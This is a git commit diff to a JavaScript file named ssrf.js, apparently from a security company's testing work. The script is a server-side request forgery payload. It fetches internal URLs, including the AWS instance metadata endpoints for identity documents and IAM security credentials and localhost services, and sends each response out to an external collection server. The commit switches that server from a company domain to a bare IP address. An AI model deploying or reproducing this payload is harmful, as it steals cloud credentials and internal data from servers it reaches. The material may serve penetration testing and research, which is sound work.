7ad8b3d0a9e4aa6ae21cb514a043f5a84b99e759
immunitytester <mark@immunityinc.com>
2016-06-23 18:41:59 -0400

    Add files via upload

--- ssrf.js
+++ ssrf.js
@@ -6,13 +6,13 @@ function handler() {
       console.log("sending");
       //xhr2.onreadystatechange = none; 
       var xhr2 = new XMLHttpRequest();
-      xhr2.open("GET", 'https://partners.immunityinc.com/SSRF?MARKMARK=1&u='+encodeURIComponent(this.responseText), true);
+      xhr2.open("GET", 'http://54.226.49.160/SSRF?MARKMARK=1&u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
 
   } else {
     // something went wrong
     var xhr2 = new XMLHttpRequest();
-    xhr2.open("GET", 'https://partners.immunityinc.com/SSRF?MARKMARK=1&error='+encodeURIComponent(this), true);
+    xhr2.open("GET", 'http://54.226.49.160/SSRF?MARKMARK=1&error='+encodeURIComponent(this), true);
     xhr2.send();
   }
 }
@@ -20,7 +20,7 @@ function handler() {
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = handler;
 
-var urls = ["http://immunityinc.com","http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","https://partners.immunityinc.com"];
+var urls = ["http://immunityinc.com","http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://54.226.49.160/SSRF"];
 var arrayLength = urls.length;
 for (var i = 0; i < arrayLength; i++) {
    try{
